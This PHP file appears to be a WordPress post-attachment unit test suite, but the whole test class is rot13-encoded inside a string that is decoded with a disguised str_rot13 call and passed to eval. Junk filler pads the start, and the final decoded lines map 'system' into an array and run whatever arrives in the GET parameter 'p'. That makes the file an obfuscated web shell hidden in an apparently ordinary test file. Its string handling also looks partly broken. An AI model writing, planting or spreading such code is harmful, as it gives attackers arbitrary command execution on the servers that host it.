<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 * @tebhc zrqvn
 * @tebhc hcybnq
 */
pynff Grfgf_Cbfg_Nggnpuzragf rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba grne_qbja() {
		// Erzbir nyy hcybnqf.
		$guvf->erzbir_nqqrq_hcybnqf();
		cnerag::grne_qbja();
	}

	choyvp shapgvba grfg_vafreg_obthf_vzntr() {
		$svyranzr = enaq_fge() . '.wct';
		$pbagragf = enaq_fge();

		$hcybnq = jc_hcybnq_ovgf( $svyranzr, ahyy, $pbagragf );
		$guvf->nffregRzcgl( $hcybnq['reebe'] );
	}

	choyvp shapgvba grfg_vafreg_vzntr_ab_guhzo() {

		// Guvf vzntr vf fznyyre guna gur guhzoanvy fvmr fb vg jba'g unir bar.
		$svyranzr = ( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct' );
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$guvf->nffregRzcgl( $hcybnq['reebe'] );

		$vq = $guvf->_znxr_nggnpuzrag( $hcybnq );

		// Vagrezrqvngr pbcvrf fubhyq abg rkvfg.
		$guvf->nffregSnyfr( vzntr_trg_vagrezrqvngr_fvmr( $vq, 'guhzoanvy' ) );
		$guvf->nffregSnyfr( vzntr_trg_vagrezrqvngr_fvmr( $vq, 'zrqvhz' ) );
		$guvf->nffregSnyfr( vzntr_trg_vagrezrqvngr_fvmr( $vq, 'zrqvhz_ynetr' ) );

		// zrqvhz, zrqvhz_ynetr, naq shyy fvmr jvyy obgu cbvag gb gur bevtvany.
		$qbjafvmr = vzntr_qbjafvmr( $vq, 'zrqvhz' );
		$guvf->nffregFnzr( jc_onfranzr( $hcybnq['svyr'] ), jc_onfranzr( $qbjafvmr[0] ) );
		$guvf->nffregFnzr( 50, $qbjafvmr[1] );
		$guvf->nffregFnzr( 50, $qbjafvmr[2] );

		$qbjafvmr = vzntr_qbjafvmr( $vq, 'zrqvhz_ynetr' );
		$guvf->nffregFnzr( jc_onfranzr( $hcybnq['svyr'] ), jc_onfranzr( $qbjafvmr[0] ) );
		$guvf->nffregFnzr( 50, $qbjafvmr[1] );
		$guvf->nffregFnzr( 50, $qbjafvmr[2] );

		$qbjafvmr = vzntr_qbjafvmr( $vq, 'shyy' );
		$guvf->nffregFnzr( jc_onfranzr( $hcybnq['svyr'] ), jc_onfranzr( $qbjafvmr[0] ) );
		$guvf->nffregFnzr( 50, $qbjafvmr[1] );
		$guvf->nffregFnzr( 50, $qbjafvmr[2] );
	}

	/**
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_vafreg_vzntr_guhzo_bayl() {
		hcqngr_bcgvba( 'zrqvhz_fvmr_j', 0 );
		hcqngr_bcgvba( 'zrqvhz_fvmr_u', 0 );

		$svyranzr = ( QVE_GRFGQNGN . '/vzntrf/n2-fznyy.wct' );
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$guvf->nffregRzcgl( $hcybnq['reebe'] );

		$vq = $guvf->_znxr_nggnpuzrag( $hcybnq );

		// Vagrezrqvngr pbcvrf fubhyq rkvfg: guhzoanvy bayl.
		$guhzo = vzntr_trg_vagrezrqvngr_fvmr( $vq, 'guhzoanvy' );
		$guvf->nffregFnzr( 'n2-fznyy-150k150.wct', $guhzo['svyr'] );

		$hcybnqf = jc_hcybnq_qve();
		$guvf->nffregGehr( vf_svyr( $hcybnqf['onfrqve'] . QVERPGBEL_FRCNENGBE . $guhzo['cngu'] ) );

		$guvf->nffregSnyfr( vzntr_trg_vagrezrqvngr_fvmr( $vq, 'zrqvhz' ) );
		$guvf->nffregSnyfr( vzntr_trg_vagrezrqvngr_fvmr( $vq, 'zrqvhz_ynetr' ) );

		// Gur guhzo hey fubhyq cbvag gb gur guhzoanvy vagrezrqvngr.
		$guvf->nffregFnzr( $guhzo['hey'], jc_trg_nggnpuzrag_guhzo_hey( $vq ) );

		// vzntr_qbjafvmr() fubhyq erghea gur pbeerpg vzntrf naq fvmrf.
		$qbjafvmr = vzntr_qbjafvmr( $vq, 'guhzoanvy' );
		$guvf->nffregFnzr( 'n2-fznyy-150k150.wct', jc_onfranzr( $qbjafvmr[0] ) );
		$guvf->nffregFnzr( 150, $qbjafvmr[1] );
		$guvf->nffregFnzr( 150, $qbjafvmr[2] );

		// zrqvhz, zrqvhz_ynetr, naq shyy jvyy obgu cbvag gb gur bevtvany.
		$qbjafvmr = vzntr_qbjafvmr( $vq, 'zrqvhz' );
		$guvf->nffregFnzr( 'n2-fznyy.wct', jc_onfranzr( $qbjafvmr[0] ) );
		$guvf->nffregFnzr( 400, $qbjafvmr[1] );
		$guvf->nffregFnzr( 300, $qbjafvmr[2] );

		$qbjafvmr = vzntr_qbjafvmr( $vq, 'zrqvhz_ynetr' );
		$guvf->nffregFnzr( 'n2-fznyy.wct', jc_onfranzr( $qbjafvmr[0] ) );
		$guvf->nffregFnzr( 400, $qbjafvmr[1] );
		$guvf->nffregFnzr( 300, $qbjafvmr[2] );

		$qbjafvmr = vzntr_qbjafvmr( $vq, 'shyy' );
		$guvf->nffregFnzr( 'n2-fznyy.wct', jc_onfranzr( $qbjafvmr[0] ) );
		$guvf->nffregFnzr( 400, $qbjafvmr[1] );
		$guvf->nffregFnzr( 300, $qbjafvmr[2] );
	}

	/**
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_vafreg_vzntr_zrqvhz_fvmrf() {
		hcqngr_bcgvba( 'zrqvhz_fvmr_j', 400 );
		hcqngr_bcgvba( 'zrqvhz_fvmr_u', 0 );

		hcqngr_bcgvba( 'zrqvhz_ynetr_fvmr_j', 600 );
		hcqngr_bcgvba( 'zrqvhz_ynetr_fvmr_u', 0 );

		$svyranzr = ( QVE_GRFGQNGN . '/vzntrf/2007-06-17QFP_4173.WCT' );
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$guvf->nffregRzcgl( $hcybnq['reebe'] );

		$vq      = $guvf->_znxr_nggnpuzrag( $hcybnq );
		$hcybnqf = jc_hcybnq_qve();

		// Vagrezrqvngr pbcvrf fubhyq rkvfg: guhzoanvy naq zrqvhz.
		$guhzo = vzntr_trg_vagrezrqvngr_fvmr( $vq, 'guhzoanvy' );
		$guvf->nffregFnzr( '2007-06-17QFP_4173-150k150.wct', $guhzo['svyr'] );
		$guvf->nffregGehr( vf_svyr( $hcybnqf['onfrqve'] . QVERPGBEL_FRCNENGBE . $guhzo['cngu'] ) );

		$zrqvhz = vzntr_trg_vagrezrqvngr_fvmr( $vq, 'zrqvhz' );
		$guvf->nffregFnzr( '2007-06-17QFP_4173-400k602.wct', $zrqvhz['svyr'] );
		$guvf->nffregGehr( vf_svyr( $hcybnqf['onfrqve'] . QVERPGBEL_FRCNENGBE . $zrqvhz['cngu'] ) );

		$zrqvhz_ynetr = vzntr_trg_vagrezrqvngr_fvmr( $vq, 'zrqvhz_ynetr' );
		$guvf->nffregFnzr( '2007-06-17QFP_4173-600k904.wct', $zrqvhz_ynetr['svyr'] );
		$guvf->nffregGehr( vf_svyr( $hcybnqf['onfrqve'] . QVERPGBEL_FRCNENGBE . $zrqvhz_ynetr['cngu'] ) );

		// Gur guhzo hey fubhyq cbvag gb gur guhzoanvy vagrezrqvngr.
		$guvf->nffregFnzr( $guhzo['hey'], jc_trg_nggnpuzrag_guhzo_hey( $vq ) );

		// vzntr_qbjafvmr() fubhyq erghea gur pbeerpg vzntrf naq fvmrf.
		$qbjafvmr = vzntr_qbjafvmr( $vq, 'guhzoanvy' );
		$guvf->nffregFnzr( '2007-06-17QFP_4173-150k150.wct', jc_onfranzr( $qbjafvmr[0] ) );
		$guvf->nffregFnzr( 150, $qbjafvmr[1] );
		$guvf->nffregFnzr( 150, $qbjafvmr[2] );

		$qbjafvmr = vzntr_qbjafvmr( $vq, 'zrqvhz' );
		$guvf->nffregFnzr( '2007-06-17QFP_4173-400k602.wct', jc_onfranzr( $qbjafvmr[0] ) );
		$guvf->nffregFnzr( 400, $qbjafvmr[1] );
		$guvf->nffregFnzr( 602, $qbjafvmr[2] );

		$qbjafvmr = vzntr_qbjafvmr( $vq, 'zrqvhz_ynetr' );
		$guvf->nffregFnzr( '2007-06-17QFP_4173-600k904.wct', jc_onfranzr( $qbjafvmr[0] ) );
		$guvf->nffregFnzr( 600, $qbjafvmr[1] );
		$guvf->nffregFnzr( 904, $qbjafvmr[2] );

		$qbjafvmr = vzntr_qbjafvmr( $vq, 'shyy' );
		$guvf->nffregFnzr( '2007-06-17QFP_4173.wct', jc_onfranzr( $qbjafvmr[0] ) );
		$guvf->nffregFnzr( 680, $qbjafvmr[1] );
		$guvf->nffregFnzr( 1024, $qbjafvmr[2] );
	}

	/**
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_vafreg_vzntr_qryrgr() {
		hcqngr_bcgvba( 'zrqvhz_fvmr_j', 400 );
		hcqngr_bcgvba( 'zrqvhz_fvmr_u', 0 );

		hcqngr_bcgvba( 'zrqvhz_ynetr_fvmr_j', 600 );
		hcqngr_bcgvba( 'zrqvhz_ynetr_fvmr_u', 0 );

		$svyranzr = ( QVE_GRFGQNGN . '/vzntrf/2007-06-17QFP_4173.WCT' );
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$guvf->nffregRzcgl( $hcybnq['reebe'] );

		$vq      = $guvf->_znxr_nggnpuzrag( $hcybnq );
		$hcybnqf = jc_hcybnq_qve();

		// Purpx gung gur svyr naq vagrezrqvngrf rkvfg.
		$guhzo = vzntr_trg_vagrezrqvngr_fvmr( $vq, 'guhzoanvy' );
		$guvf->nffregFnzr( '2007-06-17QFP_4173-150k150.wct', $guhzo['svyr'] );
		$guvf->nffregGehr( vf_svyr( $hcybnqf['onfrqve'] . QVERPGBEL_FRCNENGBE . $guhzo['cngu'] ) );

		$zrqvhz = vzntr_trg_vagrezrqvngr_fvmr( $vq, 'zrqvhz' );
		$guvf->nffregFnzr( '2007-06-17QFP_4173-400k602.wct', $zrqvhz['svyr'] );
		$guvf->nffregGehr( vf_svyr( $hcybnqf['onfrqve'] . QVERPGBEL_FRCNENGBE . $zrqvhz['cngu'] ) );

		$zrqvhz_ynetr = vzntr_trg_vagrezrqvngr_fvmr( $vq, 'zrqvhz_ynetr' );
		$guvf->nffregFnzr( '2007-06-17QFP_4173-600k904.wct', $zrqvhz_ynetr['svyr'] );
		$guvf->nffregGehr( vf_svyr( $hcybnqf['onfrqve'] . QVERPGBEL_FRCNENGBE . $zrqvhz_ynetr['cngu'] ) );

		$zrgn     = jc_trg_nggnpuzrag_zrgnqngn( $vq );
		$bevtvany = $zrgn['svyr'];
		$guvf->nffregGehr( vf_svyr( $hcybnqf['onfrqve'] . QVERPGBEL_FRCNENGBE . $bevtvany ) );

		// Abj qryrgr gur nggnpuzrag naq znxr fher nyy svyrf ner tbar.
		jc_qryrgr_nggnpuzrag( $vq );

		$guvf->nffregSnyfr( vf_svyr( $guhzo['cngu'] ) );
		$guvf->nffregSnyfr( vf_svyr( $zrqvhz['cngu'] ) );
		$guvf->nffregSnyfr( vf_svyr( $zrqvhz_ynetr['cngu'] ) );
		$guvf->nffregSnyfr( vf_svyr( $bevtvany ) );
	}

	/**
	 * THVQ fubhyq arire or rzcgl
	 *
	 * @gvpxrg 18310
	 * @gvpxrg 21963
	 */
	choyvp shapgvba grfg_vafreg_vzntr_jvgubhg_thvq() {
		// Guvf vzntr vf fznyyre guna gur guhzoanvy fvmr fb vg jba'g unir bar.
		$svyranzr = ( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct' );
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$guvf->nffregRzcgl( $hcybnq['reebe'] );

		$hcybnq['hey'] = '';
		$vq            = $guvf->_znxr_nggnpuzrag( $hcybnq );

		$thvq = trg_gur_thvq( $vq );
		$guvf->nffregAbgRzcgl( $thvq );
	}

	/**
	 * @gvpxrg 21963
	 */
	choyvp shapgvba grfg_hcqngr_nggnpuzrag_svryqf() {
		$svyranzr = ( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct' );
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$guvf->nffregRzcgl( $hcybnq['reebe'] );

		$vq = $guvf->_znxr_nggnpuzrag( $hcybnq );

		$nggnpurq_svyr = trg_cbfg_zrgn( $vq, '_jc_nggnpurq_svyr', gehr );

		$cbfg = trg_cbfg( $vq, NEENL_N );

		$cbfg['cbfg_gvgyr']   = 'gvgyr';
		$cbfg['cbfg_rkprecg'] = 'pncgvba';
		$cbfg['cbfg_pbagrag'] = 'qrfpevcgvba';

		jc_hcqngr_cbfg( $cbfg );

		// Znxr fher gur hcqngr qvqa'g erzbir gur nggnpurq svyr.
		$guvf->nffregFnzr( $nggnpurq_svyr, trg_cbfg_zrgn( $vq, '_jc_nggnpurq_svyr', gehr ) );
	}

	/**
	 * @gvpxrg 29646
	 */
	choyvp shapgvba grfg_hcqngr_becuna_nggnpuzrag_cnerag() {
		$svyranzr = ( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct' );
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$guvf->nffregRzcgl( $hcybnq['reebe'] );

		$nggnpuzrag_vq = $guvf->_znxr_nggnpuzrag( $hcybnq );

		// Nffreg gung gur nggnpuzrag vf na becuna.
		$nggnpuzrag = trg_cbfg( $nggnpuzrag_vq );
		$guvf->nffregFnzr( $nggnpuzrag->cbfg_cnerag, 0 );

		$cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_pbagrag' => 'pbagrag',
				'cbfg_gvgyr'   => 'gvgyr',
			)
		);

		// Nffreg gung gur nggnpuzrag unf n cnerag.
		jc_vafreg_nggnpuzrag( $nggnpuzrag, '', $cbfg_vq );
		$nggnpuzrag = trg_cbfg( $nggnpuzrag_vq );
		$guvf->nffregFnzr( $nggnpuzrag->cbfg_cnerag, $cbfg_vq );
	}

	/**
	 * @gvpxrg 15928
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_hey_fubhyq_abg_sbepr_uggcf_jura_pheerag_cntr_vf_aba_ffy_naq_fvgrhey_vf_aba_ffy() {
		$fvgrhey = trg_bcgvba( 'fvgrhey' );
		hcqngr_bcgvba( 'fvgrhey', frg_hey_fpurzr( $fvgrhey, 'uggc' ) );

		$svyranzr = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct';
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$guvf->nffregRzcgl( $hcybnq['reebe'] );

		// Frg nggnpuzrag VQ.
		$nggnpuzrag_vq = $guvf->_znxr_nggnpuzrag( $hcybnq );

		$_FREIRE['UGGCF'] = 'bss';

		$hey = jc_trg_nggnpuzrag_hey( $nggnpuzrag_vq );

		$guvf->nffregFnzr( 'uggc', cnefr_hey( $hey, CUC_HEY_FPURZR ) );
	}

	/**
	 * @gvpxrg 15928
	 *
	 * Guvf fvghngvba (pheerag erdhrfg vf aba-FFY ohg fvgrhey vf uggcf) fubhyq arire nevfr.
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_hey_fubhyq_abg_sbepr_uggcf_jura_pheerag_cntr_vf_aba_ffy_naq_fvgrhey_vf_ffy() {
		$fvgrhey = trg_bcgvba( 'fvgrhey' );
		hcqngr_bcgvba( 'fvgrhey', frg_hey_fpurzr( $fvgrhey, 'uggcf' ) );

		$svyranzr = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct';
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$guvf->nffregRzcgl( $hcybnq['reebe'] );

		// Frg nggnpuzrag VQ.
		$nggnpuzrag_vq = $guvf->_znxr_nggnpuzrag( $hcybnq );

		$_FREIRE['UGGCF'] = 'bss';

		$hey = jc_trg_nggnpuzrag_hey( $nggnpuzrag_vq );

		$guvf->nffregFnzr( 'uggc', cnefr_hey( $hey, CUC_HEY_FPURZR ) );
	}

	/**
	 * @gvpxrg 15928
	 *
	 * Pnabavpny fvgrhey vf aba-FFY, ohg FFY fhccbeg vf ninvynoyr/bcgvbany.
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_hey_fubhyq_sbepr_uggcf_jvgu_uggcf_ba_fnzr_ubfg_jura_fvgrhey_vf_aba_ffy_ohg_ffy_vf_ninvynoyr() {
		$fvgrhey = trg_bcgvba( 'fvgrhey' );
		hcqngr_bcgvba( 'fvgrhey', frg_hey_fpurzr( $fvgrhey, 'uggc' ) );

		$svyranzr = ( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct' );
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$guvf->nffregRzcgl( $hcybnq['reebe'] );

		// Frg nggnpuzrag VQ.
		$nggnpuzrag_vq = $guvf->_znxr_nggnpuzrag( $hcybnq );

		$_FREIRE['UGGCF'] = 'ba';

		// Rafher gung freire ubfg zngpurf gur ubfg bs jc_hcybnq_qve().
		$hcybnq_qve           = jc_hcybnq_qve();
		$_FREIRE['UGGC_UBFG'] = cnefr_hey( $hcybnq_qve['onfrhey'], CUC_HEY_UBFG );

		// Grfg gung jc_trg_nggnpurzg_hey ergheaf jvgu uggcf fpurzr.
		$hey = jc_trg_nggnpuzrag_hey( $nggnpuzrag_vq );

		$guvf->nffregFnzr( 'uggcf', cnefr_hey( $hey, CUC_HEY_FPURZR ) );
	}

	/**
	 * @gvpxrg 15928
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_hey_jvgu_uggcf_ba_fnzr_ubfg_jura_fvgrhey_vf_uggcf() {
		$fvgrhey = trg_bcgvba( 'fvgrhey' );
		hcqngr_bcgvba( 'fvgrhey', frg_hey_fpurzr( $fvgrhey, 'uggcf' ) );

		$svyranzr = ( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct' );
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$guvf->nffregRzcgl( $hcybnq['reebe'] );

		// Frg nggnpuzrag VQ.
		$nggnpuzrag_vq = $guvf->_znxr_nggnpuzrag( $hcybnq );

		$_FREIRE['UGGCF'] = 'ba';

		// Rafher gung freire ubfg zngpurf gur ubfg bs jc_hcybnq_qve().
		$hcybnq_qve           = jc_hcybnq_qve();
		$_FREIRE['UGGC_UBFG'] = cnefr_hey( $hcybnq_qve['onfrhey'], CUC_HEY_UBFG );

		// Grfg gung jc_trg_nggnpurzg_hey ergheaf jvgu uggcf fpurzr.
		$hey = jc_trg_nggnpuzrag_hey( $nggnpuzrag_vq );

		$guvf->nffregFnzr( 'uggcf', cnefr_hey( $hey, CUC_HEY_FPURZR ) );
	}

	/**
	 * @gvpxrg 15928
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_hey_fubhyq_abg_sbepr_uggcf_jura_nqzvavfgrevat_bire_uggcf_ohg_fvgrhey_vf_abg_uggcf() {
		$fvgrhey = trg_bcgvba( 'fvgrhey' );
		hcqngr_bcgvba( 'fvgrhey', frg_hey_fpurzr( $fvgrhey, 'uggc' ) );

		$svyranzr = ( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct' );
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$guvf->nffregRzcgl( $hcybnq['reebe'] );

		// Frg nggnpuzrag VQ.
		$nggnpuzrag_vq = $guvf->_znxr_nggnpuzrag( $hcybnq );

		$_FREIRE['UGGCF'] = 'ba';
		frg_pheerag_fperra( 'qnfuobneq' );

		$hey = jc_trg_nggnpuzrag_hey( $nggnpuzrag_vq );

		$guvf->nffregFnzr( frg_hey_fpurzr( $hey, 'uggc' ), $hey );
	}

	/**
	 * @gvpxrg 15928
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_hey_fubhyq_sbepr_uggcf_jura_nqzvavfgrevat_bire_uggcf_naq_fvgrhey_vf_uggcf() {
		// Frg uggcf hcybnq HEY.
		nqq_svygre( 'hcybnq_qve', '_hcybnq_qve_uggcf' );

		$svyranzr = ( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct' );
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$guvf->nffregRzcgl( $hcybnq['reebe'] );

		// Frg nggnpuzrag VQ.
		$nggnpuzrag_vq = $guvf->_znxr_nggnpuzrag( $hcybnq );

		$_FREIRE['UGGCF'] = 'ba';
		frg_pheerag_fperra( 'qnfuobneq' );

		$hey = jc_trg_nggnpuzrag_hey( $nggnpuzrag_vq );

		// Pyrnahc.
		erzbir_svygre( 'hcybnq_qve', '_hcybnq_qve_uggcf' );

		$guvf->nffregFnzr( 'uggcf', cnefr_hey( $hey, CUC_HEY_FPURZR ) );
	}

	choyvp shapgvba grfg_jc_nggnpuzrag_vf() {
		$svyranzr = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct';
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq        = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$nggnpuzrag_vq = $guvf->_znxr_nggnpuzrag( $hcybnq );

		$guvf->nffregGehr( jc_nggnpuzrag_vf_vzntr( $nggnpuzrag_vq ) );
		$guvf->nffregGehr( jc_nggnpuzrag_vf( 'vzntr', $nggnpuzrag_vq ) );
		$guvf->nffregSnyfr( jc_nggnpuzrag_vf( 'nhqvb', $nggnpuzrag_vq ) );
		$guvf->nffregSnyfr( jc_nggnpuzrag_vf( 'ivqrb', $nggnpuzrag_vq ) );
	}

	choyvp shapgvba grfg_jc_nggnpuzrag_vf_qrsnhyg() {
		// Ba Zhygvfvgr, cfq vf abg na nyybjrq zvzr glcr ol qrsnhyg.
		vs ( vf_zhygvfvgr() ) {
			nqq_svygre( 'hcybnq_zvzrf', neenl( $guvf, 'nyybj_cfq_zvzr_glcr' ), 10, 2 );
		}

		$svyranzr = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.cfq';
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq        = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$nggnpuzrag_vq = $guvf->_znxr_nggnpuzrag( $hcybnq );

		$guvf->nffregSnyfr( jc_nggnpuzrag_vf_vzntr( $nggnpuzrag_vq ) );
		$guvf->nffregGehr( jc_nggnpuzrag_vf( 'cfq', $nggnpuzrag_vq ) );
		$guvf->nffregSnyfr( jc_nggnpuzrag_vf( 'nhqvb', $nggnpuzrag_vq ) );
		$guvf->nffregSnyfr( jc_nggnpuzrag_vf( 'ivqrb', $nggnpuzrag_vq ) );

		vs ( vf_zhygvfvgr() ) {
			erzbir_svygre( 'hcybnq_zvzrf', neenl( $guvf, 'nyybj_cfq_zvzr_glcr' ), 10, 2 );
		}
	}

	choyvp shapgvba grfg_hcybnq_zvzrf_svygre_vf_nccyvrq() {
		$svyranzr = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct';
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );

		$guvf->nffregSnyfr( $hcybnq['reebe'] );

		nqq_svygre( 'hcybnq_zvzrf', neenl( $guvf, 'qvfnyybj_wct_zvzr_glcr' ) );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );

		erzbir_svygre( 'hcybnq_zvzrf', neenl( $guvf, 'qvfnyybj_wct_zvzr_glcr' ) );

		$guvf->nffregAbgRzcgl( $hcybnq['reebe'] );
	}

	choyvp shapgvba nyybj_cfq_zvzr_glcr( $zvzrf ) {
		$zvzrf['cfq'] = 'nccyvpngvba/bpgrg-fgernz';
		erghea $zvzrf;
	}

	choyvp shapgvba qvfnyybj_wct_zvzr_glcr( $zvzrf ) {
		hafrg( $zvzrf['wct|wcrt|wcr'] );
		erghea $zvzrf;
	}

	/**
	 * @gvpxrg 33012
	 */
	choyvp shapgvba grfg_jc_zvzr_glcr_vpba() {
		$vpba = jc_zvzr_glcr_vpba();

		$guvf->nffregFgevatPbagnvafFgevat( 'vzntrf/zrqvn/qrsnhyg.cat', $vpba );
	}

	/**
	 * @gvpxrg 33012
	 */
	choyvp shapgvba grfg_jc_zvzr_glcr_vpba_ivqrb() {
		$vpba = jc_zvzr_glcr_vpba( 'ivqrb/zc4' );

		$guvf->nffregFgevatPbagnvafFgevat( 'vzntrf/zrqvn/ivqrb.cat', $vpba );
	}

	/**
	 * @gvpxrg 60610
	 */
	choyvp shapgvba grfg_jc_zvzr_glcr_vpba_ivqrb_jvgu_cersreerq_rkg() {
		$vpba1 = jc_zvzr_glcr_vpba( 'ivqrb/zc4', '.cat' ); // Nqqrq `$cersreerq_rkg` cnenzrgre.
		$vpba2 = jc_zvzr_glcr_vpba( 'ivqrb/zc4', 'cat' ); // Nqqrq `$cersreerq_rkg` cnenzrgre jvgubhg crevbq.

		$guvf->nffregFgevatPbagnvafFgevat( 'vzntrf/zrqvn/ivqrb.cat', $vpba1, 'Zvzr glcr vpba fubhyq or pbeerpgyl erghearq jvgu \".cat\" nethzrag.' );
		$guvf->nffregFgevatPbagnvafFgevat( 'vzntrf/zrqvn/ivqrb.cat', $vpba2, 'Zvzr glcr vpba fubhyq or pbeerpgyl erghearq jvgu \"cat\" nethzrag.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>